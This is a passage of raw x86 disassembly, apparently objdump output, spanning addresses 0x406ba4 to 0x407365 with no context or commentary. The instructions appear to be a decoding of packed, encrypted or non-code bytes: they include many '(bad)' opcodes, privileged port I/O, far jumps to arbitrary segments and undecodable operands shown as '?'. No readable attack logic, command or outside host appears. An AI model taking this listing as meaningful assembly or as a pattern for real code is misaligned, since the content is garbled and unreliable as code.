  406ba4:	imul   ecx,DWORD PTR [edx+0x7b],0xb9c5c40d
  406bab:	iret   
  406bac:	mov    DWORD PTR [ecx+0x1a],eax
  406baf:	shl    BYTE PTR [ebp+0x774fd719],cl
  406bb5:	cdq    
  406bb6:	ins    DWORD PTR es:[edi],dx
  406bb7:	mov    al,0x2e
  406bb9:	bound  esp,QWORD PTR [edi+0xa61c40b]
  406bbf:	(bad)  
  406bc0:	in     al,dx
  406bc1:	ins    BYTE PTR es:[edi],dx
  406bc2:	adc    BYTE PTR [ecx+0x3c],0xf6
  406bc6:	rep lods eax,DWORD PTR ds:[esi]
  406bc8:	add    eax,0xbfb06bca
  406bcd:	pop    ds
  406bce:	std    
  406bcf:	lods   eax,DWORD PTR ds:[esi]
  406bd0:	(bad)  
  406bd2:	sub    BYTE PTR [ebp+0x59],bl
  406bd5:	das    
  406bd6:	xor    dh,BYTE PTR [ebx-0x4c79d152]
  406bdc:	xor    esp,ebx
  406bde:	into   
  406bdf:	mov    ch,0xb
  406be1:	std    
  406be2:	xor    esi,DWORD PTR [ecx+0x53527895]
  406be8:	ror    BYTE PTR [edx],0xb9
  406beb:	pop    ss
  406bec:	int3   
  406bed:	daa    
  406bee:	jg     0x406b7b
  406bf0:	in     al,dx
  406bf1:	and    eax,0xa282b413
  406bf6:	fld    DWORD PTR [edi+0x6]
  406bf9:	clc    
  406bfa:	or     al,0x5b
  406bfc:	mov    edx,0x7b5dd028
  406c01:	hlt    
  406c02:	and    bh,BYTE PTR [ebx]
  406c04:	pusha  
  406c05:	loopne 0x406c52
  406c07:	jmp    0xd030:0x62e6ff65
  406c0e:	int    0x22
  406c10:	push   cs
  406c11:	sub    eax,DWORD PTR [ebp-0x6d]
  406c14:	xchg   edx,eax
  406c15:	fimul  WORD PTR [edx-0x586f5419]
  406c1b:	pop    ds
  406c1c:	xor    eax,0x5c70639
  406c21:	into   
  406c22:	inc    esi
  406c23:	fwait
  406c24:	jbe    0x406c1f
  406c26:	mov    ebp,0x3a1d240c
  406c2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c2c:	lock or DWORD PTR [edx],ecx
  406c2f:	(bad)
  406c32:	lods   al,BYTE PTR ds:[esi]
  406c33:	lahf   
  406c34:	mov    gs,WORD PTR [ebx-0x6272c725]
  406c3a:	mov    ds:0x7dc58da,eax
  406c3f:	xchg   esi,eax
  406c40:	mov    edx,edx
  406c42:	dec    ebx
  406c43:	dec    eax
  406c44:	push   0x65f39626
  406c49:	test   al,0x48
  406c4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c4c:	mov    bh,0x57
  406c4e:	or     ebp,DWORD PTR [edi+0x516bb65c]
  406c54:	push   esp
  406c55:	jno    0x406c4e
  406c57:	xchg   edi,eax
  406c58:	push   es
  406c59:	fs cli 
  406c5b:	add    edi,DWORD PTR [esi+0x50]
  406c5e:	in     al,0x8e
  406c60:	lea    edx,[edx]
  406c62:	lea    ecx,[esi-0x2]
  406c65:	rcr    BYTE PTR [edi],1
  406c67:	adc    ebp,esp
  406c69:	fnstsw WORD PTR [ecx+0x1f67afd9]
  406c6f:	add    BYTE PTR [edx],ah
  406c71:	sbb    esi,esi
  406c73:	add    DWORD PTR [esi-0x41],ebp
  406c76:	mov    ch,0xb1
  406c78:	or     eax,0x684f8388
  406c7d:	fidiv  DWORD PTR [ecx]
  406c7f:	sub    dl,BYTE PTR [edx+0x71]
  406c82:	mov    dh,0xb1
  406c84:	xchg   ebx,eax
  406c85:	dec    edi
  406c86:	xchg   ebx,eax
  406c87:	add    DWORD PTR [edi+0x32],eax
  406c8a:	icebp  
  406c8b:	mov    cl,0x2b
  406c8d:	add    DWORD PTR [edi+ebp*8+0x3b],edi
  406c91:	xchg   edx,eax
  406c92:	cs cli 
  406c94:	jge    0x406cd3
  406c96:	nop
  406c97:	jmp    0x406ce8
  406c99:	jl     0x406cac
  406c9b:	hlt    
  406c9c:	mov    ds:0x996b9bb,eax
  406ca1:	in     al,dx
  406ca2:	pop    eax
  406ca3:	shr    ebp,1
  406ca5:	mov    ds:0xe639ce3d,eax
  406caa:	call   DWORD PTR [ebx]
  406cac:	mov    ebx,0x31025531
  406cb1:	jl     0x406d16
  406cb3:	xor    DWORD PTR [ebx+0x47],edx
  406cb6:	neg    BYTE PTR [esi]
  406cb8:	mov    esi,0xd3e13fc
  406cbd:	imul   BYTE PTR [edi-0x46]
  406cc0:	cmp    BYTE PTR [ebx+eiz*8],ah
  406cc3:	popa   
  406cc4:	fbld   TBYTE PTR [ecx-0x5cd866b9]
  406cca:	push   edi
  406ccb:	dec    eax
  406ccc:	jns    0x406d48
  406cce:	xor    al,0x9a
  406cd0:	mov    dl,0x9f
  406cd2:	sbb    BYTE PTR [edx],cl
  406cd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cd5:	clc    
  406cd6:	jle    0x406d3a
  406cd8:	mov    al,ds:0xed0c3dcd
  406cdd:	adc    DWORD PTR [eax+0x79],esp
  406ce0:	stos   DWORD PTR es:[edi],eax
  406ce1:	xchg   DWORD PTR [ecx],ebx
  406ce3:	sbb    BYTE PTR [ecx-0x22],0x38
  406ce7:	inc    eax
  406ce8:	in     eax,dx
  406ce9:	dec    esp
  406cea:	popa   
  406ceb:	dec    edi
  406cec:	in     eax,dx
  406ced:	dec    ecx
  406cee:	jecxz  0x406cbe
  406cf0:	pop    eax
  406cf1:	xor    eax,0x15c7ded8
  406cf6:	xchg   BYTE PTR [esi],ah
  406cf8:	inc    esp
  406cf9:	jno    0x406d3e
  406cfb:	rcr    DWORD PTR [ecx-0x54],0xfe
  406cff:	dec    ecx
  406d00:	retf   
  406d01:	inc    ebx
  406d02:	cmp    ebx,ecx
  406d04:	int    0xd1
  406d06:	mov    eax,0xacbfb0dc
  406d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d0c:	or     eax,0xde588e98
  406d11:	jmp    0x2ce:0xd25af309
  406d18:	iret   
  406d19:	xchg   DWORD PTR [edi+0x38482764],ebp
  406d1f:	inc    edi
  406d20:	xchg   ecx,eax
  406d21:	xor    al,0x6f
  406d23:	popa   
  406d24:	out    dx,al
  406d25:	jl     0x406d62
  406d27:	in     al,dx
  406d28:	imul   ecx,DWORD PTR [esi],0xbdd715a3
  406d2e:	cmp    cl,BYTE PTR [edx-0x2b]
  406d31:	cs test eax,0xa2ccbc62
  406d37:	jb     0x406d14
  406d39:	pop    edx
  406d3a:	imul   esp,DWORD PTR [ebx-0xf],0x2b
  406d3e:	xchg   edx,eax
  406d3f:	popa   
  406d40:	aad    0x9d
  406d42:	sub    BYTE PTR [esi],cl
  406d44:	shl    DWORD PTR ds:0xe2442dd8,1
  406d4a:	loopne 0x406d42
  406d4c:	ficomp DWORD PTR [eax]
  406d4e:	mov    ds:0xcfb8078c,al
  406d53:	or     ah,0xa0
  406d56:	outs   dx,BYTE PTR ds:[esi]
  406d57:	sbb    eax,0x475334e9
  406d5c:	inc    esp
  406d5d:	xor    DWORD PTR [ebp+0x5976df51],0xffffff9d
  406d64:	cmp    ah,0xa
  406d67:	sub    DWORD PTR [esi],eax
  406d69:	(bad)  
  406d6a:	out    dx,eax
  406d6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d6c:	inc    eax
  406d6d:	js     0x406dc6
  406d6f:	jp     0x406d3b
  406d71:	mov    edi,0x2091c9f8
  406d76:	ret    0xbc3e
  406d79:	inc    eax
  406d7a:	inc    edi
  406d7b:	jg     0x406d00
  406d7d:	cmp    al,BYTE PTR [eax-0x71]
  406d80:	push   cs
  406d81:	pop    ecx
  406d82:	pop    ebx
  406d83:	mov    edx,esp
  406d85:	pop    ebx
  406d86:	out    0x23,eax
  406d88:	cs aaa 
  406d8a:	mov    esp,0x5f39423e
  406d8f:	repz xor esi,DWORD PTR [ebx+0x36cd021]
  406d96:	and    ecx,DWORD PTR es:[edx+0x112b762e]
  406d9d:	adc    ebp,esp
  406d9f:	jns    0x406dd5
  406da1:	dec    esi
  406da2:	adc    eax,0x208f03d
  406da7:	es sub eax,0xab556e90
  406dad:	dec    esp
  406dae:	out    dx,al
  406daf:	jnp    0x406d4e
  406db1:	lods   al,BYTE PTR ds:[esi]
  406db2:	push   ss
  406db3:	mov    eax,ds:0xede36d32
  406db8:	popa   
  406db9:	or     DWORD PTR ds:0x16a02f96,esi
  406dbf:	cld    
  406dc0:	popa   
  406dc1:	pop    edx
  406dc2:	jle    0x406d4f
  406dc4:	push   ds
  406dc5:	fidiv  WORD PTR [edi-0x4e08a42a]
  406dcb:	ins    DWORD PTR es:[edi],dx
  406dcc:	or     eax,0xb429fc21
  406dd1:	jecxz  0x406d7c
  406dd3:	xchg   ebp,eax
  406dd4:	addr16 push ebp
  406dd6:	in     eax,dx
  406dd7:	adc    esi,DWORD PTR [ecx+0x3143cff4]
  406ddd:	cmp    BYTE PTR [edx-0x740fddec],0x46
  406de4:	pop    ebp
  406de5:	test   BYTE PTR [edx-0x70f9016c],dh
  406deb:	push   0x28
  406ded:	int3   
  406dee:	dec    esp
  406def:	inc    edi
  406df0:	or     al,0x80
  406df2:	jl     0x406dcf
  406df4:	lock scas al,BYTE PTR es:[edi]
  406df6:	rcl    ebx,1
  406df8:	xor    eax,eax
  406dfa:	xchg   ebx,eax
  406dfb:	je     0x406e5b
  406dfd:	clc    
  406dfe:	jo     0x406e7a
  406e00:	aaa    
  406e01:	imul   ebx,DWORD PTR [edi-0x144097ca],0xb2e0e57e
  406e0b:	push   edx
  406e0c:	xchg   edi,eax
  406e0d:	mov    ds:0xd38d3d48,eax
  406e12:	dec    edi
  406e13:	cmovne eax,DWORD PTR [ebx]
  406e16:	mov    al,0xab
  406e18:	adc    esp,DWORD PTR [ecx+edx*4-0x1e5ee1ac]
  406e1f:	popf   
  406e20:	fnstsw WORD PTR [ebx+0x563a5ce8]
  406e26:	fisubr DWORD PTR [ebp+0x3bf777b0]
  406e2c:	adc    ch,dl
  406e2e:	hlt    
  406e2f:	push   edx
  406e30:	arpl   WORD PTR [ebx+0x52],sp
  406e33:	in     eax,0xd0
  406e35:	adc    eax,0xda2723df
  406e3a:	and    al,0xff
  406e3c:	je     0x406e1b
  406e3e:	cmp    eax,0xfb7a8f25
  406e43:	(bad)  
  406e45:	mov    dh,BYTE PTR [esi+0x25]
  406e48:	xlat   BYTE PTR ds:[ebx]
  406e49:	push   ebp
  406e4a:	loope  0x406eb8
  406e4c:	repz push ebp
  406e4e:	jle    0x406ec6
  406e50:	data16 into 
  406e52:	leave  
  406e53:	and    esp,DWORD PTR [bx+si+0x52]
  406e57:	daa    
  406e58:	adc    al,0x8e
  406e5a:	adc    dl,BYTE PTR [ebx+0x1b45ea0f]
  406e60:	jle    0x406e01
  406e62:	cld    
  406e63:	imul   esi,DWORD PTR ds:0x6d65fdf5,0x8529a4
  406e6d:	cmp    cl,BYTE PTR [eax-0x79]
  406e70:	std    
  406e71:	int3   
  406e72:	adc    BYTE PTR [esi-0x64dafb77],ch
  406e78:	adc    edx,DWORD PTR [eax-0x6e319aae]
  406e7e:	fmul   QWORD PTR [edi-0x25]
  406e81:	jno    0x406ee7
  406e83:	dec    ebp
  406e84:	or     edx,eax
  406e86:	js     0x406e66
  406e88:	(bad)
  406e8b:	mov    DWORD PTR [ebp+0x71],edi
  406e8e:	jp     0x406eb9
  406e90:	bound  ebx,QWORD PTR [ecx]
  406e92:	inc    esp
  406e93:	repz test al,0xe7
  406e96:	fstp   TBYTE PTR [edx]
  406e98:	dec    esi
  406e99:	(bad)  
  406e9a:	rol    DWORD PTR [esi-0xf],1
  406e9d:	inc    esi
  406e9e:	pop    edx
  406e9f:	or     DWORD PTR [eax],eax
  406ea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ea2:	pushw  0x7e3b
  406ea6:	mov    eax,ds:0x6375a81
  406eab:	push   ebp
  406eac:	adc    BYTE PTR [ebx],ah
  406eae:	out    0x68,eax
  406eb0:	inc    esp
  406eb1:	repnz fnstenv [eax-0x24]
  406eb5:	fisub  WORD PTR [esi+eiz*1+0x5]
  406eb9:	jmp    0xc41241d9
  406ebe:	mov    ds:0x8f83e32b,al
  406ec3:	sub    DWORD PTR [ecx],ecx
  406ec5:	push   ebp
  406ec6:	fisubr DWORD PTR [ebp-0x6d]
  406ec9:	cs and ah,dl
  406ecc:	pop    ebp
  406ecd:	inc    edi
  406ece:	test   BYTE PTR [edx+ebx*2],dh
  406ed1:	jle    0x406ec4
  406ed3:	or     cl,BYTE PTR [ebp-0xc]
  406ed6:	and    bl,BYTE PTR [ecx]
  406ed8:	adc    edx,ecx
  406eda:	mov    al,ds:0x94e98f14
  406edf:	push   ss
  406ee0:	enter  0xbebf,0x67
  406ee4:	sub    edi,edi
  406ee6:	pushf  
  406ee7:	push   0xffffffc8
  406ee9:	jmp    0x3a2eae27
  406eee:	fimul  WORD PTR gs:[eax+0x1b]
  406ef2:	add    dh,BYTE PTR [ebp+0x63]
  406ef5:	aas    
  406ef6:	test   ebp,edx
  406ef8:	or     al,0xcb
  406efa:	fbstp  TBYTE PTR [edi+0x1a]
  406efd:	(bad)  
  406efe:	lock std 
  406f00:	cli    
  406f01:	enter  0x89fb,0xb8
  406f05:	mov    esi,0x1eacd2ce
  406f0a:	jno    0x406ec7
  406f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f0d:	add    al,0x90
  406f0f:	test   ch,dh
  406f11:	arpl   WORD PTR [esp+edx*4],si
  406f14:	pop    ss
  406f15:	andnps xmm0,XMMWORD PTR [edx]
  406f18:	xor    esp,0x79
  406f1b:	das    
  406f1c:	cmp    ah,BYTE PTR [ecx-0x5678d498]
  406f22:	pop    es
  406f23:	bndldx (bad),[edx+0x72]
  406f27:	pop    ss
  406f28:	and    BYTE PTR [edx-0x66a7c775],bl
  406f2e:	jg     0x406f30
  406f30:	cmp    DWORD PTR [edx],ecx
  406f32:	(bad)  
  406f33:	pop    ss
  406f34:	inc    edi
  406f35:	pop    ebp
  406f36:	sub    dh,al
  406f38:	push   edi
  406f39:	xchg   edi,eax
  406f3a:	sbb    dl,BYTE PTR [ecx+0xd23c06d]
  406f40:	stos   BYTE PTR es:[edi],al
  406f41:	inc    ebp
  406f42:	or     al,0xb2
  406f44:	lods   eax,DWORD PTR ds:[esi]
  406f45:	xor    ebx,DWORD PTR [edx]
  406f47:	ret    0xaaf8
  406f4a:	shl    BYTE PTR [bx+si+0x72ef],0x87
  406f50:	aaa    
  406f51:	mov    al,0x34
  406f53:	fwait
  406f54:	cmp    edx,ebp
  406f56:	xchg   edi,eax
  406f57:	icebp  
  406f58:	xchg   BYTE PTR [ecx+0x44],ah
  406f5b:	iret   
  406f5c:	cmc    
  406f5d:	data16 (bad) 
  406f5f:	pop    esp
  406f60:	inc    eax
  406f61:	es in  al,dx
  406f63:	pop    edx
  406f64:	pushf  
  406f65:	out    dx,eax
  406f66:	fidiv  WORD PTR [edi+0x5d]
  406f69:	daa    
  406f6a:	sar    eax,0xb4
  406f6d:	sbb    al,BYTE PTR [edx]
  406f6f:	imul   BYTE PTR [edi+0x1091b1bf]
  406f75:	into   
  406f76:	daa    
  406f77:	sbb    DWORD PTR [esi],esp
  406f79:	push   ecx
  406f7a:	push   ds
  406f7b:	shr    BYTE PTR [edi+0xb20228c],cl
  406f81:	pop    esi
  406f82:	mov    ah,0x68
  406f84:	dec    eax
  406f85:	mov    esp,ss
  406f87:	dec    ebp
  406f88:	mov    ch,0x3d
  406f8a:	sub    esi,DWORD PTR [eax+0x1f]
  406f8d:	mov    BYTE PTR [esp+ebp*1-0x3b0819b9],ch
  406f94:	pusha  
  406f95:	lods   al,BYTE PTR ds:[esi]
  406f96:	add    dl,ch
  406f98:	pop    ss
  406f99:	(bad)  
  406f9a:	cmp    BYTE PTR [edi-0xd],cl
  406f9d:	ins    DWORD PTR es:[edi],dx
  406f9e:	xlat   BYTE PTR ds:[ebx]
  406f9f:	loopne 0x406fda
  406fa1:	ds push esi
  406fa3:	call   0xbe11:0x7dbf98c6
  406faa:	mov    ecx,0x37a7ae14
  406faf:	(bad)  
  406fb0:	push   esp
  406fb1:	xor    eax,0xc167c0cd
  406fb6:	stos   DWORD PTR es:[edi],eax
  406fb7:	in     eax,dx
  406fb8:	fbld   TBYTE PTR [ecx-0x280227bf]
  406fbe:	xlat   BYTE PTR ds:[ebx]
  406fbf:	add    eax,0x40116998
  406fc4:	xchg   ebx,eax
  406fc5:	js     0x406fb1
  406fc7:	out    0xf3,eax
  406fc9:	cmp    edi,ecx
  406fcb:	enter  0xd7b5,0x2e
  406fcf:	repnz push ebx
  406fd1:	ret    
  406fd2:	sahf   
  406fd3:	es jmp 0x51a3:0xf1c3e051
  406fdb:	repnz (bad) 
  406fdd:	xchg   edi,eax
  406fde:	pushf  
  406fdf:	loop   0x407015
  406fe1:	jne    0x406fb5
  406fe3:	mov    ds:0x8fe0eff6,eax
  406fe8:	psraw  mm6,QWORD PTR [ecx-0x2a091208]
  406fef:	lock int3 
  406ff1:	mov    al,ds:0xcc8a2059
  406ff6:	ja     0x406f9d
  406ff8:	push   cs
  406ff9:	iretw  
  406ffb:	scas   al,BYTE PTR es:[edi]
  406ffc:	fstp   TBYTE PTR [ecx]
  406ffe:	push   ds
  406fff:	add    al,al
  407001:	pop    ss
  407002:	out    0xd2,al
  407004:	sub    eax,DWORD PTR [eax+0x45]
  407007:	ss xor dl,bh
  40700a:	sub    eax,0xfe810995
  40700f:	dec    eax
  407010:	xor    eax,0x12fa486f
  407015:	cli    
  407016:	scas   al,BYTE PTR es:[edi]
  407017:	mov    ebx,0xadadc426
  40701c:	push   0x84ef12ca
  407021:	into   
  407022:	fbstp  TBYTE PTR [edx-0x6513dc80]
  407028:	jg     0x407092
  40702a:	pop    eax
  40702b:	add    al,0x35
  40702d:	mov    esi,0x1311b5ac
  407032:	jecxz  0x40706f
  407034:	mov    al,0xf1
  407036:	scas   eax,DWORD PTR es:[edi]
  407037:	int3   
  407038:	mov    eax,esi
  40703a:	cld    
  40703b:	test   BYTE PTR [edi],cl
  40703d:	push   ecx
  40703e:	mov    ch,BYTE PTR [ecx-0x121036d3]
  407044:	iret   
  407045:	imul   esp,DWORD PTR [ecx-0x3c458cbb],0xad443283
  40704f:	ds aaa 
  407051:	sbb    al,0xa4
  407053:	add    DWORD PTR [edx],esi
  407055:	mov    edi,DWORD PTR [ebp-0x142ecbb1]
  40705b:	or     al,0x92
  40705d:	xlat   BYTE PTR es:[ebx]
  40705f:	xchg   ebp,eax
  407060:	xor    BYTE PTR [eax+0x59765b13],0x9f
  407067:	mov    ?,WORD PTR [edx+esi*8]
  40706a:	mov    WORD PTR [edx-0x468721ea],?
  407070:	and    DWORD PTR [ebp+0x20966f01],esi
  407076:	dec    esi
  407077:	nop
  407078:	fnstsw WORD PTR [eax]
  40707a:	xchg   edx,eax
  40707b:	add    cl,0xae
  40707e:	cdq    
  40707f:	imul   eax,DWORD PTR [edi+ecx*8],0x2
  407083:	adc    eax,0xe42cbd6a
  407088:	shl    eax,0xf5
  40708b:	lahf   
  40708c:	inc    ebx
  40708d:	lea    edi,[ecx-0x80]
  407090:	jle    0x407082
  407092:	popf   
  407093:	or     eax,0x90e195dd
  407098:	fs sbb al,0x67
  40709b:	popf   
  40709c:	or     al,0xab
  40709e:	and    DWORD PTR [ebp+0x12],edi
  4070a1:	pop    es
  4070a2:	(bad)  
  4070a3:	mov    eax,ds:0xc8e80791
  4070a8:	cs adc ah,dl
  4070ab:	mov    ebx,0x48ffee65
  4070b0:	jg     0x4070ff
  4070b2:	int3   
  4070b3:	clc    
  4070b4:	pinsrw mm5,WORD PTR [edi+eiz*8],0x6a
  4070b9:	loopne 0x4070a9
  4070bb:	sbb    esp,ecx
  4070bd:	mov    ebp,0xe51ca395
  4070c2:	loop   0x4070f2
  4070c4:	call   0xd282:0xdb9b9a03
  4070cb:	xchg   edi,ecx
  4070cd:	xchg   esp,eax
  4070ce:	out    dx,eax
  4070cf:	sub    al,0x9f
  4070d1:	retf   
  4070d2:	(bad)  
  4070d3:	clc    
  4070d4:	push   ds
  4070d5:	retf   
  4070d6:	jno    0x40710b
  4070d8:	sti    
  4070d9:	push   0xac13b93e
  4070de:	add    eax,0x62739813
  4070e3:	out    dx,eax
  4070e4:	fisttp QWORD PTR [ebx-0x51]
  4070e7:	(bad)  [ecx+0x2a38615e]
  4070ed:	mov    eax,ds:0xac5938af
  4070f2:	leave  
  4070f3:	leave  
  4070f4:	mov    ds:0x663ccaaa,al
  4070f9:	pop    ss
  4070fa:	inc    ebp
  4070fb:	mov    edi,0x2b1e5a1d
  407100:	mov    ebx,DWORD PTR [eax]
  407102:	mov    al,0xbd
  407104:	test   BYTE PTR [edx+0x55e64386],ah
  40710a:	xor    eax,0xe3020494
  40710f:	push   eax
  407110:	pop    ds
  407111:	jnp    0x407102
  407113:	dec    edx
  407114:	pop    edi
  407115:	repz xchg esp,eax
  407117:	aas    
  407118:	stos   BYTE PTR es:[di],al
  40711a:	mov    cl,0xe1
  40711c:	(bad)  
  40711e:	mov    edx,0x48a5806f
  407123:	test   al,0x56
  407125:	sub    BYTE PTR [bx+si+0x2b30],cl
  40712a:	xor    al,0xca
  40712c:	adc    DWORD PTR [edi-0x41],0xea93ae63
  407133:	inc    ecx
  407134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407135:	fs (bad) 
  407137:	dec    esi
  407138:	pop    ss
  407139:	jmp    0x6dba:0x9a182a51
  407140:	or     al,0x80
  407142:	inc    eax
  407143:	stos   BYTE PTR es:[edi],al
  407144:	mov    dl,0x26
  407146:	aaa    
  407147:	call   0xa10fe2f5
  40714c:	sbb    dh,BYTE PTR [edi-0x39]
  40714f:	adc    DWORD PTR [ecx],0xb9803a92
  407155:	fsubr  DWORD PTR ds:0xf91a2be0
  40715b:	fidiv  DWORD PTR [edx+eiz*2+0x17]
  40715f:	fdivr  DWORD PTR [edi-0x4]
  407162:	pushf  
  407163:	mov    esp,0x7f3cb200
  407168:	ins    BYTE PTR es:[edi],dx
  407169:	mov    ds:0xdf9f9369,eax
  40716e:	cmp    bl,BYTE PTR [ebx]
  407170:	lahf   
  407171:	lods   eax,DWORD PTR ds:[esi]
  407172:	(bad)  
  407173:	jmp    0x407160
  407175:	sub    edi,eax
  407177:	xchg   ecx,eax
  407178:	cld    
  407179:	pusha  
  40717a:	jnp    0x407142
  40717c:	or     DWORD PTR ds:0xc4df9580,0x295013b3
  407186:	sbb    al,0x5f
  407188:	and    eax,0xd770db25
  40718d:	jae    0x40718a
  40718f:	std    
  407190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407191:	push   ds
  407192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407193:	test   eax,0x76101642
  407198:	ins    BYTE PTR es:[edi],dx
  407199:	cmp    edx,edx
  40719b:	ins    DWORD PTR es:[edi],dx
  40719c:	mov    edi,0x30f62a36
  4071a1:	xor    eax,0x72353b78
  4071a6:	adc    DWORD PTR [edi],ebx
  4071a8:	lock loope 0x40720b
  4071ab:	gs out dx,eax
  4071ad:	dec    edx
  4071ae:	ficomp WORD PTR ds:[eax]
  4071b1:	adc    al,0x2
  4071b3:	inc    esi
  4071b4:	mov    eax,ds:0xe92d7313
  4071b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071ba:	aas    
  4071bb:	cmp    ch,cl
  4071bd:	sub    BYTE PTR [edx-0x29b76e69],bl
  4071c3:	sub    esp,ebp
  4071c5:	mov    esi,DWORD PTR [edi-0x13555113]
  4071cb:	dec    ebx
  4071cc:	ret    0x3744
  4071cf:	(bad)  [eax-0x114b6247]
  4071d5:	test   eax,0xabf56924
  4071da:	leave  
  4071db:	pop    esi
  4071dc:	xchg   ebp,eax
  4071dd:	mov    bl,0xe2
  4071df:	mov    cl,0x56
  4071e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071e2:	jg     0x40717b
  4071e4:	push   esp
  4071e5:	ror    DWORD PTR [edi-0x5a4093e6],1
  4071eb:	nop
  4071ec:	js     0x407200
  4071ee:	fdiv   st(2),st
  4071f0:	sub    eax,0x42b0865e
  4071f5:	enter  0x797c,0xc7
  4071f9:	sar    DWORD PTR [esi-0x6e01e7a7],0xab
  407200:	mov    cl,0x6
  407202:	cwde   
  407203:	dec    ebx
  407204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407205:	ret    
  407206:	in     al,0xf
  407208:	xor    eax,0x9e009b13
  40720d:	adc    ecx,DWORD PTR [eax]
  40720f:	inc    edx
  407210:	sub    ecx,esi
  407212:	inc    edx
  407213:	ret    0x3e86
  407216:	repnz dec esi
  407218:	push   0x795ead20
  40721d:	jmp    0x40722e
  40721f:	mov    dl,0xa7
  407221:	xchg   DWORD PTR [edi+0x677fc210],eax
  407227:	adc    ecx,edx
  407229:	imul   ecx,ebp,0x39
  40722c:	popf   
  40722d:	inc    eax
  40722e:	sbb    eax,0x1d3f8b2d
  407233:	mov    ecx,esp
  407235:	xor    BYTE PTR [esi+0x79],0x18
  407239:	sti    
  40723a:	and    al,0x32
  40723c:	inc    ebx
  40723d:	jg     0x40722a
  40723f:	inc    esi
  407240:	xchg   ecx,eax
  407241:	fidiv  DWORD PTR [esi+0x19]
  407244:	jo     0x407268
  407246:	pop    ss
  407247:	adc    eax,esi
  407249:	dec    ebx
  40724a:	imul   edi,DWORD PTR [bx+di-0x40a6],0xc2c853d8
  407253:	mov    eax,ds:0xfa6f1acb
  407258:	xlat   BYTE PTR ds:[ebx]
  407259:	loope  0x407246
  40725b:	cmp    DWORD PTR [eax+0xf9f0d40],edx
  407261:	sub    eax,DWORD PTR [ecx-0x7d]
  407264:	std    
  407265:	xchg   ebx,eax
  407266:	adc    eax,0x8fe5d5ed
  40726b:	jecxz  0x407261
  40726d:	ins    DWORD PTR es:[edi],dx
  40726e:	in     al,0x18
  407270:	sub    al,0xe4
  407272:	es sub al,0xa4
  407275:	imul   esp,DWORD PTR [esi-0x71],0xf5c9bfb1
  40727c:	pushf  
  40727d:	push   ecx
  40727e:	push   0x5830d951
  407283:	rcr    BYTE PTR [ecx+ebx*8+0x68],1
  407287:	lock or al,0xde
  40728a:	cld    
  40728b:	nop
  40728c:	call   0xc42827fe
  407291:	mov    ds:0x1687810c,eax
  407296:	je     0x40722a
  407298:	fsubr  st,st(0)
  40729a:	jmp    0x407272
  40729c:	add    ah,BYTE PTR [ecx+0x26]
  40729f:	outs   dx,BYTE PTR ds:[esi]
  4072a0:	call   0x7ceb8746
  4072a5:	arpl   WORD PTR [edx-0x5b303044],si
  4072ab:	(bad)  
  4072ac:	call   0x1829f24f
  4072b1:	daa    
  4072b2:	pusha  
  4072b3:	dec    ebx
  4072b4:	push   esi
  4072b5:	popa   
  4072b6:	sbb    al,0xb3
  4072b8:	pop    esp
  4072b9:	mov    eax,ds:0x1f9909f5
  4072be:	mov    bl,0x3
  4072c0:	inc    edx
  4072c1:	jg     0x4072e3
  4072c3:	push   edi
  4072c4:	popa   
  4072c5:	not    BYTE PTR es:0xb1b742f2
  4072cc:	adc    al,0xb9
  4072ce:	xor    DWORD PTR [ebx+edx*2-0x9],ecx
  4072d2:	scas   eax,DWORD PTR es:[edi]
  4072d3:	adc    DWORD PTR [ecx-0x52fbb37e],eax
  4072d9:	cmp    al,0xa1
  4072db:	enter  0x9c4f,0x82
  4072df:	push   es
  4072e0:	(bad)  
  4072e1:	cmp    dh,bl
  4072e3:	mov    al,0x8e
  4072e5:	cmp    al,0xac
  4072e7:	sub    eax,0x1e1a589f
  4072ec:	sbb    al,0xc3
  4072ee:	xchg   DWORD PTR [ecx-0x35067ea5],eax
  4072f4:	in     al,0x10
  4072f6:	cmp    eax,0x340183a5
  4072fb:	in     al,dx
  4072fc:	push   0x6fc5214b
  407301:	inc    esp
  407302:	inc    eax
  407303:	jbe    0x4072c3
  407305:	in     eax,0xc1
  407307:	dec    edx
  407308:	cld    
  407309:	(bad)  
  40730a:	psubq  mm4,QWORD PTR [ecx+0x726b8954]
  407311:	pop    ebp
  407312:	mov    ecx,0xe7da11ba
  407317:	sti    
  407318:	leave  
  407319:	jno    0x407347
  40731b:	sbb    al,0x47
  40731d:	ds mov bl,0xb1
  407320:	dec    edx
  407321:	daa    
  407322:	mov    ah,0xac
  407324:	add    DWORD PTR [edi],esp
  407326:	cld    
  407327:	lahf   
  407328:	iret   
  407329:	in     al,dx
  40732a:	(bad)  
  40732b:	(bad)  
  40732c:	xchg   ecx,eax
  40732d:	jb     0x4072f5
  40732f:	frstor [ecx+0x2a]
  407332:	mov    BYTE PTR [eax],al
  407334:	xchg   esp,eax
  407335:	imul   ebp,DWORD PTR [edx+0x2],0xffffff83
  407339:	pop    es
  40733a:	add    al,0x19
  40733c:	aad    0x23
  40733e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40733f:	lods   eax,DWORD PTR ds:[esi]
  407340:	xchg   esp,eax
  407341:	ins    DWORD PTR es:[edi],dx
  407342:	mov    ebp,0x3b916259
  407347:	inc    esi
  407348:	push   esi
  407349:	dec    edx
  40734a:	cli    
  40734b:	mov    dl,0xec
  40734d:	inc    edx
  40734e:	imul   ecx,DWORD PTR [edx+edx*8],0x6d866a49
  407355:	sub    edx,ebp
  407357:	les    eax,FWORD PTR [esi-0x1c900c90]
  40735d:	lods   al,BYTE PTR ds:[esi]
  40735e:	jle    0x407351
  407360:	cmp    ch,al
  407362:	stos   BYTE PTR es:[edi],al
  407363:	xchg   esp,eax
  407364:	lods   eax,DWORD PTR ds:[esi]
  407365:	test   eax,edi
